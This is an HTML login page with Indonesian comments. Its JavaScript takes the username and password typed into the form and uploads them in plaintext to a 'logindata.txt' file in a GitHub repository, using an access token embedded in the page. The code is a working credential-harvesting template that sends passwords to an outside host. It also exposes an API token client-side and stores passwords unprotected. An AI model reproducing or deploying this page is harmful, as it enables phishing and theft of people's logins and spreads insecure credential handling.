<!DOCTYPE html>
<html>
<head>
    <title>Login Page dengan GitHub Submit</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            width: 300px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 15px;
            text-align: center;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Login</h2>
        <form id="loginForm">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            
            <input type="submit" value="Login">
        </form>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const status = document.getElementById('status');
            
            // Simpan data ke GitHub
            fetch('https://api.github.com/repos/[USERNAME]/[REPO]/contents/logindata.txt', {
                method: 'PUT',
                headers: {
                    'Authorization': 'token [GITHUB_TOKEN]',
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: 'Update login data',
                    content: btoa(`Username: ${username}, Password: ${password}\n`),
                    sha: '' // Kosongkan jika file belum ada
                })
            })
            .then(response => response.json())
            .then(data => {
                status.innerHTML = 'Data berhasil disimpan ke GitHub';
                status.style.color = 'green';
            })
            .catch(error => {
                status.innerHTML = 'Error menyimpan data: ' + error;
                status.style.color = 'red';
            });
        });
    </script>
</body>
</html>
